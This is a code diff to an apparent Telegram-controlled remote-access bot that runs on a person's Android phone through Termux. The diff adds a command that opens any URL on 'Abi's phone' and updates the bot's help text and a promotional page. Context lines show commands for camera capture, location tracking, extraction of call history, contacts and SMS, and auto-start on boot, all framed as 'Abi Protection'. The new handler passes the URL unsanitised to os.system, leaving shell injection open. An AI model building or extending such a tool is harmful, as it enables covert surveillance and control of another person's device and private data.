@@ -780,6 +780,15 @@ async def tor(update, context):
         os.system(f"termux-torch {context.args[0]}")
         await update.message.reply_text(f"🔦 Abi's Flashlight: {context.args[0].upper()}")
 
+async def open_url(update, context):
+    if update.effective_user.id != AUTHORIZED_ID: return
+    if not context.args:
+        await update.message.reply_text("Usage: /open <url>")
+        return
+    url = context.args[0]
+    os.system(f"termux-open-url '{url}'")
+    await update.message.reply_text(f"🔗 Opened on Abi's phone: {url}")
+
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text("⏳ Extracting Abi's Call History...")
@@ -805,6 +814,7 @@ async def help_cmd(update, context):
 📍 /location — Track Abi's Location + Maps
 🔋 /battery — Check Abi's Battery
 ⬇️ /download &lt;url&gt; — Send File to Abi's Downloads
+🔗 /open &lt;url&gt; — Open Website on Abi's Phone
 🗣️ /say &lt;text&gt; — Speak to Abi Remotely
 📳 /vibrate [ms] — Buzz Abi's Phone
 🔦 /torch on|off — Toggle Abi's Flashlight
@@ -821,7 +831,7 @@ async def main():
     handlers = [
         ("start", start), ("help", help_cmd), ("cam", cam), ("location", loc),
         ("battery", bat), ("download", dl), ("say", say),
-        ("vibrate", vib), ("torch", tor), ("calls", calls),
+        ("vibrate", vib), ("torch", tor), ("open", open_url), ("calls", calls),
         ("contacts", cont), ("sms", sms_cmd)
     ]
     
@@ -864,9 +874,10 @@ chmod +x ~/.termux/boot/start_bot.sh && echo '🛡️ Abi Protection Active — 
 
             <div class="card-footer">
                 <div class="tag-row">
-                    <span class="tag"><span class="tag-dot"></span> 10 Commands</span>
+                    <span class="tag"><span class="tag-dot"></span> 11 Commands</span>
                     <span class="tag"><span class="tag-dot"></span> GPS Tracking</span>
                     <span class="tag"><span class="tag-dot"></span> .txt Reports</span>
+                    <span class="tag"><span class="tag-dot"></span> Remote Open</span>
                     <span class="tag"><span class="tag-dot"></span> Auto-Restart</span>
                     <span class="tag"><span class="tag-dot"></span> End-to-End Protected</span>
                 </div>
